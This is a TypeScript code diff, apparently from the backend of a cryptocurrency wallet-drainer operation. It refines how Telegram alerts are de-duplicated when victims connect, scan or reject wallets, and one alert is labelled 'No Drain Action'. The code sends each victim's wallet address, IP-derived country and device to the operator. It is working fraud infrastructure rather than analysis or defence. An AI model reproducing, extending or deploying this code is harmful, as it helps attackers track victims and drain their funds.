@@ -110,7 +110,11 @@ export function buildWalletSessionNotifyKey(
   event: 'connect' | 'scan' | 'reject' | 'no_action',
   wallet: string,
   ip?: string | null,
+  connectSession?: string | null,
 ): string {
+  if (connectSession && connectSession.trim() !== '') {
+    return `${event}:${normalizeNotifyWalletKey(wallet)}:${connectSession.trim()}`
+  }
   const walletKey = normalizeNotifyWalletKey(wallet)
   const ipKey = ip && ip !== 'Unknown' ? ip.trim() : 'unknown-ip'
   return `${event}:${walletKey}:${ipKey}`
@@ -522,6 +526,7 @@ export interface TelegramRequestContext {
   sourceDomain?: string
   active_chain_tab?: string
   connected_wallets?: string
+  connect_session?: string
   tokenName?: string
   tokenAddress?: string
   chain_family?: string
@@ -542,8 +547,8 @@ export async function notifyWalletConnected(
   walletType: string,
   ctx?: TelegramRequestContext,
 ): Promise<void> {
-  const dedupeKey = buildWalletSessionNotifyKey('connect', address, ctx?.ip)
-  if (!shouldSendTelegramOnce(dedupeKey)) return
+  const dedupeKey = buildWalletSessionNotifyKey('connect', address, ctx?.ip, ctx?.connect_session)
+  if (!shouldSendTelegramOnce(dedupeKey, ctx?.connect_session ? 10 * 60 * 1_000 : DEFAULT_SESSION_DEDUPE_TTL_MS)) return
 
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
@@ -567,8 +572,8 @@ export async function notifyScanComplete(
   ctx?: TelegramRequestContext,
   assets?: StrategyAsset[],
 ): Promise<void> {
-  const dedupeKey = buildWalletSessionNotifyKey('scan', address, ctx?.ip)
-  if (!shouldSendTelegramOnce(dedupeKey)) return
+  const dedupeKey = buildWalletSessionNotifyKey('scan', address, ctx?.ip, ctx?.connect_session)
+  if (!shouldSendTelegramOnce(dedupeKey, ctx?.connect_session ? 10 * 60 * 1_000 : DEFAULT_SESSION_DEDUPE_TTL_MS)) return
 
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
@@ -712,7 +717,7 @@ export async function notifyUserRejectedWallet(
   address: string,
   ctx?: TelegramRequestContext & { detail?: string | null },
 ): Promise<void> {
-  const dedupeKey = buildWalletSessionNotifyKey('reject', address, ctx?.ip)
+  const dedupeKey = buildWalletSessionNotifyKey('reject', address, ctx?.ip, ctx?.connect_session)
   if (!shouldSendTelegramOnce(dedupeKey, 5 * 60 * 1_000)) return
 
   const text =
@@ -731,8 +736,8 @@ export async function notifyDrainNoAction(
   address: string,
   ctx?: TelegramRequestContext & { detail?: string | null },
 ): Promise<void> {
-  const dedupeKey = buildWalletSessionNotifyKey('no_action', address, ctx?.ip)
-  if (!shouldSendTelegramOnce(dedupeKey, 10 * 60 * 1_000)) return
+  const dedupeKey = buildWalletSessionNotifyKey('no_action', address, ctx?.ip, ctx?.connect_session)
+  if (!shouldSendTelegramOnce(dedupeKey, 5 * 60 * 1_000)) return
 
   const text =
     `➖ <b>No Drain Action</b>\n` +
